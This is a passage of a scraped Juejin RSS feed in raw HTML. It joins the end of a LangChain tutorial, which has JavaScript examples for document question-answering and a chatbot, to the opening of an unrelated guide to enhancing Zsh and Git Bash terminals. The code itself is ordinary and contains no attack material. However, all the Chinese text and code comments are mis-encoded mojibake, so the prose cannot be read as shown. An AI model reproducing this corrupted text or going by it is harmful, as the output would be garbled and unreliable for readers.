<span class="hljs-comment">// æé—®</span>
<span class="hljs-keyword">const</span> question = <span class="hljs-string">'æ–‡æ¡£ä¸­å…³äºé¡¹ç›®æ—¶é—´è¡¨çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ'</span>;
<span class="hljs-keyword">const</span> answer = <span class="hljs-keyword">await</span> qa.<span class="hljs-title function_">run</span>(question);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(answer);
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé¦–å…ˆä½¿ç”¨Â <code>DocumentLoader</code>Â åŠ è½½æ–‡æ¡£ï¼Œç„¶åé€šè¿‡Â <code>RecursiveCharacterTextSplitter</code>Â å°†æ–‡æ¡£åˆ†å‰²æˆè¾ƒå°çš„å—ï¼Œä»¥ä¾¿äºå¤„ç†ã€‚æ¥ç€ï¼Œä½¿ç”¨Â <code>OpenAIEmbeddings</code>Â ä¸ºæ¯ä¸ªæ–‡æœ¬å—ç”ŸæˆåµŒå…¥å‘é‡ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨Â <code>Chroma</code>Â å‘é‡æ•°æ®åº“ä¸­ã€‚é€šè¿‡Â <code>asRetriever</code>Â æ–¹æ³•åˆ›å»ºæ£€ç´¢å™¨ï¼Œæœ€åæ„å»ºÂ <code>RetrievalQA</code>Â å®ä¾‹æ¥å›ç­”ç”¨æˆ·çš„é—®é¢˜ã€‚è¿™ç§æ–¹å¼èƒ½å¤Ÿæœ‰æ•ˆåœ°åˆ©ç”¨æ–‡æ¡£ä¸­çš„ä¿¡æ¯ï¼Œä¸ºç”¨æˆ·æä¾›å‡†ç¡®çš„ç­”æ¡ˆã€‚2.Â <strong>æ™ºèƒ½èŠå¤©æœºå™¨äºº</strong>ï¼šç»“åˆ LangChain çš„å¤šç§ç»„ä»¶ï¼Œå¯ä»¥æ„å»ºä¸€ä¸ªæ™ºèƒ½èŠå¤©æœºå™¨äººã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š</p>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatOpenAI</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/openai'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConversationChain</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/chains'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PromptTemplate</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/core/prompts'</span>;

<span class="hljs-comment">// åˆå§‹åŒ–è¯­è¨€æ¨¡å‹</span>
<span class="hljs-keyword">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChatOpenAI</span>({ <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span> });

<span class="hljs-comment">// å®šä¹‰æç¤ºè¯æ¨¡æ¿</span>
<span class="hljs-keyword">const</span> prompt = <span class="hljs-title class_">PromptTemplate</span>.<span class="hljs-title function_">fromTemplate</span>(<span class="hljs-string">`
  ä½ æ˜¯ä¸€ä¸ªå‹å¥½çš„èŠå¤©æœºå™¨äººï¼Œä¸ç”¨æˆ·è¿›è¡Œè‡ªç„¶å¯¹è¯ã€‚ç”¨æˆ·è¯´ï¼š{input}
`</span>);

<span class="hljs-comment">// åˆ›å»ºå¯¹è¯é“¾</span>
<span class="hljs-keyword">const</span> conversation = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConversationChain</span>({ prompt, <span class="hljs-attr">llm</span>: model });

<span class="hljs-comment">// ä¸ç”¨æˆ·å¯¹è¯</span>
<span class="hljs-keyword">const</span> userInput = <span class="hljs-string">'ä½ å¥½ï¼Œä»Šå¤©å¤©æ°”å¦‚ä½•ï¼Ÿ'</span>;
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> conversation.<span class="hljs-title function_">predict</span>({ <span class="hljs-attr">input</span>: userInput });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨Â <code>ChatOpenAI</code>Â åˆå§‹åŒ–ä¸€ä¸ªè¯­è¨€æ¨¡å‹ï¼Œç„¶åé€šè¿‡Â <code>PromptTemplate</code>Â å®šä¹‰å¯¹è¯çš„æç¤ºè¯æ¨¡æ¿ã€‚æ¥ç€ï¼Œåˆ›å»ºÂ <code>ConversationChain</code>Â å®ä¾‹ï¼Œå°†æç¤ºè¯æ¨¡æ¿å’Œè¯­è¨€æ¨¡å‹ä¼ å…¥ã€‚æœ€åï¼Œé€šè¿‡Â <code>predict</code>Â æ–¹æ³•ä¸ç”¨æˆ·è¿›è¡Œå¯¹è¯ï¼Œå¹¶è¾“å‡ºæ¨¡å‹çš„å›ç­”ã€‚é€šè¿‡ä¸æ–­ä¼˜åŒ–æç¤ºè¯å’Œè°ƒæ•´æ¨¡å‹å‚æ•°ï¼Œå¯ä»¥ä½¿èŠå¤©æœºå™¨äººçš„å›ç­”æ›´åŠ è‡ªç„¶ã€å‡†ç¡®å’Œæœ‰é’ˆå¯¹æ€§ã€‚</p>
<p>é€šè¿‡ä¸Šè¿°ä»£ç ç¤ºä¾‹å’Œè¯¦ç»†è§£æï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ° LangChain åœ¨å®é™…åº”ç”¨ä¸­çš„å¼ºå¤§åŠŸèƒ½å’Œä¾¿æ·æ€§ã€‚å®ƒä¸ä»…ç®€åŒ–äº†ä¸å¤§æ¨¡å‹çš„äº¤äº’æµç¨‹ï¼Œè¿˜é€šè¿‡çµæ´»çš„æç¤ºè¯ç®¡ç†ã€æ¨¡å‹å‚æ•°è°ƒæ•´ä»¥åŠä¸°å¯Œçš„ç»„ä»¶é›†æˆï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸°å¯Œçš„å®šåˆ¶åŒ–é€‰é¡¹ï¼Œæ»¡è¶³å„ç§ä¸åŒçš„ AI åº”ç”¨å¼€å‘éœ€æ±‚ã€‚æ— è®ºæ˜¯æ„å»ºæ™ºèƒ½èŠå¤©æœºå™¨äººã€è‡ªåŠ¨åŒ–æ–‡æ¡£ç”Ÿæˆå·¥å…·ã€æ–‡æ¡£é—®ç­”ç³»ç»Ÿï¼Œè¿˜æ˜¯å…¶ä»–åŸºäºè¯­è¨€å¤„ç†çš„åˆ›æ–°åº”ç”¨ï¼ŒLangChain éƒ½ä¸ºå¼€å‘è€…æ­å»ºäº†ä¸€ä¸ªé«˜æ•ˆã€å¼ºå¤§çš„å¼€å‘å¹³å°ï¼ŒåŠ©åŠ›å¼€å‘è€…åœ¨äººå·¥æ™ºèƒ½é¢†åŸŸåˆ›é€ å‡ºæ›´å¤šå…·æœ‰åˆ›æ–°æ€§å’Œå®ç”¨ä»·å€¼çš„åº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Zshã€GitBash ç»ˆç«¯å¢å¼ºæŒ‡å—ï¼ˆWindowsã€Mac/Liunxï¼‰]]></title>    <link>https://juejin.cn/post/7588711557500665906</link>    <guid>https://juejin.cn/post/7588711557500665906</guid>    <pubDate>2025-12-29T06:40:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588711557500665906" data-draft-id="7588695570636062758" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Zshã€GitBash ç»ˆç«¯å¢å¼ºæŒ‡å—ï¼ˆWindowsã€Mac/Liunxï¼‰"/> <meta itemprop="keywords" content="Shell"/> <meta itemprop="datePublished" content="2025-12-29T06:40:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¡å°”ç‰¹æ–¯"/> <meta itemprop="url" content="https://juejin.cn/user/4450440831840909"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Zshã€GitBash ç»ˆç«¯å¢å¼ºæŒ‡å—ï¼ˆWindowsã€Mac/Liunxï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4450440831840909/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¡å°”ç‰¹æ–¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:40:10.000Z" title="Mon Dec 29 2025 06:40:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Shell ç»ˆç«¯å¢å¼ºå®Œå…¨æŒ‡å—</h2>
<blockquote>
<p>æœ¬æŒ‡å—æ¶µç›– <strong>Zsh</strong> å’Œ <strong>Git Bash</strong> ä¸¤å¤§ Shell ç¯å¢ƒçš„å¢å¼ºé…ç½®ï¼Œé€‚ç”¨äº macOSã€Linux å’Œ Windows ç³»ç»Ÿã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ğŸ“Œ æ ¸å¿ƒæ¦‚å¿µé€ŸæŸ¥ï¼ˆ3 åˆ†é’Ÿçœ‹æ‡‚ï¼‰</h3>
<h4 data-id="heading-2">ä»€ä¹ˆæ˜¯ Shellï¼Ÿ</h4>
<p><strong>Shell</strong> = ä½ å’Œè®¡ç®—æœºå¯¹è¯çš„"ç¿»è¯‘å™¨"ï¼Œåœ¨ç»ˆç«¯ï¼ˆTerminalï¼‰ä¸­è¾“å…¥å‘½ä»¤ï¼ŒShell è´Ÿè´£æ‰§è¡Œã€‚</p>
<h4 data-id="heading-3">Bash vs Zshï¼Ÿ</h4>






























<table><thead><tr><th>å¯¹æ¯”</th><th>Bash</th><th>Zsh</th></tr></thead><tbody><tr><td><strong>é»˜è®¤ç³»ç»Ÿ</strong></td><td>Linuxã€Git Bash</td><td>macOS (æ–°ç‰ˆ)</td></tr><tr><td><strong>è‡ªåŠ¨è¡¥å…¨</strong></td><td>åŸºç¡€</td><td>å¼ºå¤§ â­â­â­â­â­</td></tr><tr><td><strong>æ’ä»¶ç”Ÿæ€</strong></td><td>å°‘</td><td>ä¸°å¯Œ â­â­â­â­â­</td></tr><tr><td><strong>ä¸Šæ‰‹éš¾åº¦</strong></td><td>ç®€å•</td><td>ä¸­ç­‰</td></tr></tbody></table>
<h4 data-id="heading-4">Oh My Zsh æ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<p><strong>Oh My Zsh</strong> = Zsh çš„"æ’ä»¶å•†åº—"ï¼Œè®©å®‰è£…æ’ä»¶å’Œåˆ‡æ¢ä¸»é¢˜å˜å¾—è¶…ç®€å•ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">ç±»æ¯”ç†è§£ï¼š
<span class="hljs-attr">Zsh</span> = iPhone
Oh My <span class="hljs-attr">Zsh</span> = App Store
æ’ä»¶ = å„ç§ App
</code></pre>
<h4 data-id="heading-5">ä¸ºä»€ä¹ˆéœ€è¦æ’ä»¶ï¼Ÿ</h4>
<p><strong>å› ä¸ºåŸç”Ÿ Shell åŠŸèƒ½å¤ªåŸºç¡€ï¼</strong> å°±åƒæ‰‹æœºä¸è£… Appï¼Œåªèƒ½æ‰“ç”µè¯å‘çŸ­ä¿¡ã€‚</p>
<p><strong>è£…äº†æ’ä»¶åçš„æ•ˆæœå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># âŒ æ²¡è£…æ’ä»¶</span>
$ git status
$ <span class="hljs-built_in">cd</span> ../../../../project/src/components

<span class="hljs-comment"># âœ… è£…äº†æ’ä»¶</span>
$ gst           <span class="hljs-comment"># Git åˆ«åï¼Œå°‘æ•² 9 ä¸ªå­—ç¬¦</span>
$ z comp        <span class="hljs-comment"># æ™ºèƒ½è·³è½¬ï¼Œå°‘æ•² 30+ ä¸ªå­—ç¬¦</span>
$ [æŒ‰ Ctrl+R]   <span class="hljs-comment"># æ¨¡ç³Šæœç´¢å†å²ï¼Œç§’æ‰¾å‘½ä»¤</span>
</code></pre>
<h4 data-id="heading-6">å®‰è£…æµç¨‹æ€»è§ˆ</h4>
<pre><code class="hljs language-markdown" lang="markdown">Zsh æ–¹æ¡ˆï¼ˆmacOS/Linux/WSLï¼‰ï¼š
<span class="hljs-bullet">1.</span> å®‰è£… Zsh ç¨‹åº          â† å¼•æ“
<span class="hljs-bullet">2.</span> å®‰è£… Oh My Zsh         â† æ’ä»¶å•†åº—
<span class="hljs-bullet">3.</span> å®‰è£…æ’ä»¶               â† åŠŸèƒ½å¢å¼º
<span class="hljs-bullet">4.</span> ç¼–è¾‘ .zshrc é…ç½®       â† å¯ç”¨åŠŸèƒ½
<span class="hljs-bullet">5.</span> source ~/.zshrc        â† ç”Ÿæ•ˆ

Git Bash æ–¹æ¡ˆï¼ˆWindowsï¼‰ï¼š
<span class="hljs-bullet">1.</span> å®‰è£… Git Bash          â† è‡ªå¸¦ Bash
<span class="hljs-bullet">2.</span> å®‰è£…ç‹¬ç«‹å·¥å…·           â† fzfã€batã€z ç­‰
<span class="hljs-bullet">3.</span> ç¼–è¾‘ .bashrc é…ç½®      â† å¯ç”¨åŠŸèƒ½
<span class="hljs-bullet">4.</span> source ~/.bashrc       â† ç”Ÿæ•ˆ
</code></pre>
<h4 data-id="heading-7">æˆ‘è¯¥é€‰å“ªä¸ªï¼Ÿ</h4>
<pre><code class="hljs language-scss" lang="scss">ä½ çš„ç³»ç»Ÿï¼Ÿ
â”œâ”€ macOS/Linux     â†’ Zsh + Oh My Zsh â­â­â­â­â­
â”œâ”€ Windows (å¼€å‘)  â†’ WSL + Zsh â­â­â­â­â­
â””â”€ Windows (è½»åº¦)  â†’ Git Bash + åŸºç¡€å¢å¼º â­â­â­â­
</code></pre>
<hr/>
<h3 data-id="heading-8">ç›®å½•</h3>
<ol>
<li>
<p><a href="#%E4%B8%80zsh-%E5%A2%9E%E5%BC%BA%E6%8C%87%E5%8D%97" title="#%E4%B8%80zsh-%E5%A2%9E%E5%BC%BA%E6%8C%87%E5%8D%97">Zsh å¢å¼ºæŒ‡å—</a></p>
<ul>
<li><a href="#11-%E6%8E%A8%E8%8D%90%E6%8F%92%E4%BB%B6%E5%88%97%E8%A1%A8" title="#11-%E6%8E%A8%E8%8D%90%E6%8F%92%E4%BB%B6%E5%88%97%E8%A1%A8">æ¨èæ’ä»¶</a></li>
<li><a href="#12-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE" title="#12-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE">å®‰è£…é…ç½®</a></li>
<li><a href="#13-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7" title="#13-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7">ä½¿ç”¨æŠ€å·§</a></li>
<li><a href="#14-%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE" title="#14-%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">ä¸»é¢˜é…ç½®</a></li>
<li><a href="#15-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98" title="#15-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">å¸¸è§é—®é¢˜</a></li>
</ul>
</li>
<li>
<p><a href="#%E4%BA%8Cgit-bash-%E5%A2%9E%E5%BC%BA%E6%8C%87%E5%8D%97-windows" title="#%E4%BA%8Cgit-bash-%E5%A2%9E%E5%BC%BA%E6%8C%87%E5%8D%97-windows">Git Bash å¢å¼ºæŒ‡å—</a></p>
<ul>
<li><a href="#21-%E6%8E%A8%E8%8D%90%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8" title="#21-%E6%8E%A8%E8%8D%90%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8">æ¨èå·¥å…·</a></li>
<li><a href="#22-%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC" title="#22-%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC">ä¸€é”®å®‰è£…</a></li>
<li><a href="#23-%E5%AE%8C%E6%95%B4%E9%85%8D%E7%BD%AE%E7%A4%BA%E4%BE%8B" title="#23-%E5%AE%8C%E6%95%B4%E9%85%8D%E7%BD%AE%E7%A4%BA%E4%BE%8B">é…ç½®ç¤ºä¾‹</a></li>
<li><a href="#24-%E6%96%B9%E6%A1%88%E9%80%89%E6%8B%A9%E5%AF%B9%E6%AF%94" title="#24-%E6%96%B9%E6%A1%88%E9%80%89%E6%8B%A9%E5%AF%B9%E6%AF%94">æ–¹æ¡ˆå¯¹æ¯”</a></li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-9">ä¸€ã€Zsh å¢å¼ºæŒ‡å—</h2>
<blockquote>
<p><strong>é€‚ç”¨ç³»ç»Ÿ</strong>ï¼šmacOSã€Linuxã€Windows (WSL)</p>
</blockquote>
<h3 data-id="heading-10">1.0 æ ¸å¿ƒæ¦‚å¿µè¯´æ˜</h3>
<h4 data-id="heading-11">ä»€ä¹ˆæ˜¯ Zshï¼Ÿ</h4>
<p><strong>Zshï¼ˆZ Shellï¼‰</strong> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å‘½ä»¤è¡Œ Shellï¼Œå¯ä»¥ç†è§£ä¸º<strong>ç»ˆç«¯çš„"å¤§è„‘"</strong>ã€‚</p>
<pre><code class="hljs">ç®€å•ç±»æ¯”ï¼š
Shellï¼ˆBash/Zshï¼‰= æ±½è½¦å¼•æ“
æ’ä»¶ = æ±½è½¦é…ä»¶ï¼ˆå¯¼èˆªã€å€’è½¦å½±åƒç­‰ï¼‰
ä¸»é¢˜ = æ±½è½¦å¤–è§‚
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆç”¨ Zsh è€Œä¸æ˜¯é»˜è®¤çš„ Bashï¼Ÿ</strong></p>
<ul>
<li>âœ… æ›´å¼ºå¤§çš„<strong>è‡ªåŠ¨è¡¥å…¨</strong>åŠŸèƒ½</li>
<li>âœ… æ›´å‹å¥½çš„<strong>å‘½ä»¤æç¤º</strong></li>
<li>âœ… ä¸°å¯Œçš„<strong>æ’ä»¶ç”Ÿæ€</strong></li>
<li>âœ… å¯è‡ªå®šä¹‰çš„<strong>ä¸»é¢˜ç³»ç»Ÿ</strong></li>
</ul>
<h4 data-id="heading-12">ä»€ä¹ˆæ˜¯ Oh My Zshï¼Ÿ</h4>
<p><strong>Oh My Zsh</strong> æ˜¯ä¸€ä¸ª <strong>Zsh çš„é…ç½®ç®¡ç†æ¡†æ¶</strong>ï¼Œå¯ä»¥ç†è§£ä¸º <strong>"æ’ä»¶å•†åº— + é…ç½®ç®¡ç†å™¨"</strong>ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">ç±»æ¯”ç†è§£ï¼š
<span class="hljs-attr">Zsh</span> = å®‰å“ç³»ç»Ÿ
Oh My <span class="hljs-attr">Zsh</span> = åº”ç”¨å•†åº—ï¼ˆGoogle Playï¼‰
æ’ä»¶ = å„ç§ App
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ Oh My Zshï¼Ÿ</strong></p>
<ul>
<li>ğŸ¯ <strong>ç®€åŒ–æ’ä»¶å®‰è£…</strong>ï¼šæ‰‹åŠ¨é…ç½® Zsh æ’ä»¶å¾ˆå¤æ‚ï¼ŒOh My Zsh å¸®ä½ ç®¡ç†</li>
<li>ğŸ¨ <strong>ä¸»é¢˜åˆ‡æ¢æ–¹ä¾¿</strong>ï¼šä¸€è¡Œé…ç½®å°±èƒ½æ¢ä¸»é¢˜</li>
<li>ğŸ“¦ <strong>å†…ç½®å¤§é‡æ’ä»¶</strong>ï¼šgitã€dockerã€npm ç­‰å¸¸ç”¨æ’ä»¶å¼€ç®±å³ç”¨</li>
<li>ğŸ”„ <strong>ç»Ÿä¸€é…ç½®ç®¡ç†</strong>ï¼šæ‰€æœ‰é…ç½®éƒ½åœ¨ <code>~/.zshrc</code> ä¸€ä¸ªæ–‡ä»¶é‡Œ</li>
</ul>
<h4 data-id="heading-13">ä¸‰è€…å…³ç³»å›¾</h4>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          ä½ çš„ç»ˆç«¯ï¼ˆTerminalï¼‰              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚      Zshï¼ˆShell ç¨‹åºï¼‰             â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚   Oh My Zshï¼ˆé…ç½®æ¡†æ¶ï¼‰      â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  â”‚  æ’ä»¶1: autosuggestionsâ”‚  â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  â”‚  æ’ä»¶2: syntax-highlightâ”‚  â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  â”‚  æ’ä»¶3: fzf            â”‚  â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  â”‚  ä¸»é¢˜: robbyrussell    â”‚  â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-14">å®‰è£…æµç¨‹è§£æ</h4>
<p><strong>ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªé¡ºåºï¼Ÿ</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">æ­¥éª¤1: å®‰è£… Zsh</span>
      â†“ï¼ˆå…ˆæœ‰å¼•æ“ï¼‰
<span class="hljs-section">æ­¥éª¤2: å®‰è£… Oh My Zsh  </span>
      â†“ï¼ˆå†è£…ç®¡ç†å™¨ï¼‰
<span class="hljs-section">æ­¥éª¤3: å®‰è£…æ’ä»¶</span>
      â†“ï¼ˆæœ€ååŠ é…ä»¶ï¼‰
<span class="hljs-section">æ­¥éª¤4: é…ç½® .zshrc</span>
